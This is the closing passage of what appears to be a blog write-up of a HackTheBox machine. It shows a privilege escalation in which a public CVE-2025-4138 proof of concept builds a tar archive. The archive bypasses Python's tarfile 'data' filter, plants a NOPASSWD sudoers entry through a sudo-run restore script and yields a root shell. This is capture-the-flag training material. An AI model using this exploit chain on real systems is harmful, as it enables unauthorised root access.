+<p>this is what got me wondering. at this point, the inputs are clean, the paths are controlled, there's hardcoded base dirs, and even regex validation, but the contents of the tar file are never validated... it literally just trusts that <code>filter="data"</code> will prevent anything malicious inside the archive from escaping the staging dir.</p>
+<p>this led me to wonder if there are any CVE's for Python 3.12.3 that bypass this, which led me to discover <strong>2</strong> CVE's<br />
+<img src="/images/wingdata/Pasted%20image%2020260321171506.png" alt="CVE-2025-4138 and CVE-2025-4517" /></p>
+<p>both exploit a PATH_MAX overflow in <code>os.path.realpath()</code> to bypass <code>filter="data"</code>, the only difference is that CVE-2025-4138 uses arbitrary symlink creation outside the extraction dir, whereas CVE-2025-4517 uses arbitrary filesystem writes outside the extraction dir</p>
+<p>both achieve the same end result so it doesn't really matter which you choose, but i went with CVE-2025-4138, specifically <a href="https://github.com/kyakei/CVE-2025-4138-poc/tree/main" target="_blank" rel="noopener">this</a> PoC, it has an explanation at the top if you're interested</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> python3 privesc.py <span class="at">-o</span> /tmp/backup_1002.tar <span class="at">-u</span> wacky</span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="ex">_____________</span>   _______________         _______________   ________   .________            _____ ____________    ______</span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="ex">\_</span>   ___ <span class="dt">\ </span>  <span class="dt">\ </span>/   /\_   _____/         <span class="dt">\_</span>____  <span class="dt">\ </span>  _  <span class="dt">\ </span> <span class="dt">\_</span>____  <span class="dt">\ </span> <span class="kw">|</span>   <span class="ex">____/</span>           /  <span class="kw">|</span>  <span class="ex">/_</span>   <span class="dt">\_</span>____  <span class="dt">\ </span> /  __  <span class="dt">\</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>/    <span class="dt">\ </span> <span class="dt">\/\ </span>  Y   /  <span class="kw">|</span>    <span class="ex">__</span><span class="er">)</span><span class="ex">_</span>   ______  /  ____/  /_\  <span class="dt">\ </span> /  ____/  <span class="kw">|</span><span class="ex">____</span>  <span class="dt">\ </span>  ______  /   <span class="kw">|</span>  <span class="kw">||</span>   <span class="kw">|</span> <span class="ex">_</span><span class="er">(</span><span class="ex">__</span>  <span class="op">&lt;</span>  <span class="op">&gt;</span>      <span class="op">&lt;</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="ex">\ </span>    <span class="dt">\_</span>___<span class="dt">\ </span>    /   <span class="kw">|</span>        <span class="ex">\ /_____/</span> /       <span class="dt">\ </span> <span class="dt">\_</span>/   <span class="dt">\/</span>       <span class="dt">\ </span> /       <span class="dt">\ </span>/_____/ /    ^   /   <span class="kw">|</span><span class="ex">/</span>       <span class="dt">\/</span>   <span class="at">--</span>   <span class="dt">\</span></span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a> <span class="dt">\_</span>_____  / <span class="dt">\_</span>__/   /_______  /         <span class="dt">\_</span>______ <span class="dt">\_</span>____  /\_______ <span class="dt">\/</span>______  /         <span class="dt">\_</span>___   <span class="kw">||</span><span class="ex">___/______</span>  /\______  /</span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a>        <span class="ex">\/</span>                  <span class="dt">\/</span>                  <span class="dt">\/</span>     <span class="dt">\/</span>         <span class="dt">\/</span>       <span class="dt">\/</span>               <span class="kw">|</span><span class="ex">__</span><span class="kw">|</span>           <span class="ex">\/</span>        <span class="dt">\/</span></span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a>   <span class="ex">CVE-2025-4138</span> Auto-Sudo by kyakei</span>
+<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Target User:  wacky</span>
+<span id="cb21-13"><a href="#cb21-13" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Target File:  /etc/sudoers.d/wacky</span>
+<span id="cb21-14"><a href="#cb21-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Payload:      wacky ALL=<span class="er">(</span><span class="ex">ALL</span><span class="kw">)</span> <span class="ex">NOPASSWD:</span> ALL</span>
+<span id="cb21-15"><a href="#cb21-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-16"><a href="#cb21-16" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Exploit generated successfully: /tmp/backup_1002.tar</span>
+<span id="cb21-17"><a href="#cb21-17" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Size: 112640 bytes</span>
+<span id="cb21-18"><a href="#cb21-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-19"><a href="#cb21-19" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Next Steps:</span>
+<span id="cb21-20"><a href="#cb21-20" aria-hidden="true" tabindex="-1"></a>    <span class="ex">1.</span> Transfer this tar file to the target machine <span class="er">(</span><span class="cf">if</span> <span class="ex">remote</span><span class="kw">)</span><span class="bu">.</span></span>
+<span id="cb21-21"><a href="#cb21-21" aria-hidden="true" tabindex="-1"></a>    <span class="ex">2.</span> Wait for a privileged process <span class="er">(</span><span class="ex">using</span> vulnerable Python<span class="kw">)</span> <span class="ex">to</span> extract it.</span>
+<span id="cb21-22"><a href="#cb21-22" aria-hidden="true" tabindex="-1"></a>    <span class="ex">3.</span> OR, if you have a vulnerable SUID python script, run it against this tar.</span>
+<span id="cb21-23"><a href="#cb21-23" aria-hidden="true" tabindex="-1"></a>    <span class="ex">4.</span> Once extracted, run: <span class="st">&#39;sudo su&#39;</span> to get a root shell.</span></code></pre></div>
+<div class="sourceCode" id="cb22"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> scp /tmp/backup_1002.tar wacky@wingdata.htb:/opt/backup_clients/backups/backup_1002.tar</span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">wacky@wingdata.htb</span><span class="st">&#39;s password:</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="st">backup_1002.tar</span></span></code></pre></div>
+<div class="sourceCode" id="cb23"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">wacky@wingdata:/tmp$</span> sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py <span class="at">-b</span> backup_1002.tar <span class="at">-r</span> restore_pwned</span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Backup: backup_1002.tar</span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Staging directory: /opt/backup_clients/restored_backups/restore_pwned</span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Extraction completed in /opt/backup_clients/restored_backups/restore_pwned</span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="ex">wacky@wingdata:/tmp$</span> sudo su</span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a><span class="ex">root@wingdata:/tmp</span></span></code></pre></div>
+<p>THX FOR READING!!!</p>
+<p><img src="/images/wingdata/tony-sopranos-with-piocosta-5vut49gvwx03txs5.gif" /></p>
+
+    </div>
+
+    <nav class="post-nav" aria-label="more posts">
+        <a class="prev" href="/posts/htb-pterodactyl/" rel="prev"><span class="post-nav-label">‹ older</span>HackTheBox: Pterodactyl</a>
+        <a class="next" href="/posts/htb-kobold/" rel="next"><span class="post-nav-label">newer ›</span>HackTheBox: Kobold</a>
+    </nav>
+</article>
+
+<aside class="post-aside" aria-label="on this page">
+    <ul class="aside-actions">
+        <li><a href="/posts/htb-pterodactyl/" title="older: HackTheBox: Pterodactyl" aria-label="older post">‹</a></li>
+        <li><a href="/posts/htb-kobold/" title="newer: HackTheBox: Kobold" aria-label="newer post">›</a></li>
+        <li><a href="#top" class="to-top" title="back to top" aria-label="back to top">↑</a></li>
+    </ul>
+    <nav class="toc toc-side" aria-label="contents"><ol><li class="toc-h2"><a href="#tldr">tldr:</a></li><li class="toc-h2"><a href="#rce-revshell">rce-&gt;revshell</a></li></ol></nav>
+</aside>
+
+        </main>
+        <footer class="site-footer">
+    <span class="footer-left">
+        <span>&copy; 2024–2026 river</span>
+        <button type="button" class="contact-button" aria-controls="toast" data-label="email" data-value="Y29udGFjdEByaXZlcnMuc2g=">email</button><button type="button" class="contact-button" aria-controls="toast" data-label="signal" data-value="cml2LjEzMzc=">signal</button><button type="button" class="contact-button" aria-controls="toast" data-label="pgp" data-value="QzREQiAxMjc3IDJCQjUgNDY1NyBFQjM3IDQxODQgOEE3QSAwOTQyIDFEQjQgODE4Mg==">pgp</button>
+    </span>
+    <span class="footer-links">
+        <a href="/atom.xml">atom</a>
+        <button type="button" class="scheme-toggle" title="switch colour scheme">scheme: <span class="scheme-name">river</span></button>
+    </span>
+    <div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
+</footer>
+
+    </div>
+    <script src="/js/main.js" defer></script>
+    
+    
+    <script>
+    // oneko chases the cursor, so skip it on touch screens
+    (function () {
+      if (!matchMedia("(hover: hover) and (pointer: fine)").matches) return;
+      var s = document.createElement("script");
+      s.src = "/js/oneko.js";
+      document.body.appendChild(s);
+    })();
+    </script>
+    
+</body>
+</html>
